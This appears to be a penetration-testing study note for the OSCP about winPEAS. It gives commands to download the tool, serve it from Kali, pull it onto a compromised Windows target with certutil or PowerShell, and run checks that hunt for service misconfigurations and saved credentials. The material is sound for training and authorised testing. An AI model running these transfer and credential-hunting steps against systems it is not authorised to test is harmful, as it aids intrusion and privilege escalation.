---
title: "winPEAS"
slug: winpeas
category: notes
handbook: oscp
tags: ["privilege-escalation", "windows"]
draft: false
pubDatetime: 2026-07-22T08:58:39+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "winPEAS enumerates a Windows host for privilege escalation vectors and highlights the most promising findings."
---
winPEAS enumerates a Windows host for privilege escalation vectors and highlights the most promising findings. It is the automated first pass after a foothold, run alongside the manual checks in [Privilege Escalation (Windows)](/collections/oscp/privilege-escalation-windows). It is the Windows counterpart to [LinPEAS](/collections/oscp/linpeas) and ships from the same `peass-ng/PEASS-ng` repo.

## Install

Download from the latest release on Kali. Three builds cover the cases:

```bash
# .NET executable, self-detects architecture
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEASany.exe
# or the batch version when .NET is unavailable
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat
```

`winPEASx64.exe` and `winPEASx86.exe` are the architecture-specific builds; `winPEASany.exe` works on either.

## Transfer to the Target

Serve it from Kali and pull it over on the target:

```bash
# Kali
sudo python3 -m http.server 80
```

```cmd
:: target, cmd
certutil -urlcache -split -f http://KALI/winPEASany.exe C:\Temp\winPEASany.exe
```

```powershell
# target, PowerShell
iwr -Uri http://KALI/winPEASany.exe -OutFile C:\Temp\winPEASany.exe
```

An SMB share (`impacket-smbserver share . -smb2support`) also works and avoids writing over HTTP.

## Colours

winPEAS highlights findings in colour, but a raw `cmd` shell will not render them until virtual-terminal processing is enabled. Set it once and reopen the shell:

```cmd
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

## Run

Run all checks while skipping the slow searches, and keep a `cmd`-friendly format:

```cmd
winPEASany.exe quiet cmd fast
```

- `quiet`: drop the banner.
- `cmd`: format for a plain command prompt.
- `fast`: skip the time-consuming file searches (drop it for a full sweep).

Run specific categories to focus a hunt:

```cmd
winPEASany.exe quiet servicesinfo        :: service misconfigurations
winPEASany.exe quiet windowscreds        :: saved creds, AlwaysInstallElevated
winPEASany.exe quiet filesinfo userinfo  :: files and users (slow)
winPEASany.exe quiet applicationsinfo    :: AutoRuns and installed apps
```

## Read the Output

Findings are coloured by likelihood, red on the most probable escalation vectors. Treat a highlight as a lead, not a finished exploit: confirm each service, file, or registry ACL with [accesschk](/collections/oscp/accesschk) before acting, then feed the confirmed findings into the triage order in [Privilege Escalation (Windows)](/collections/oscp/privilege-escalation-windows).
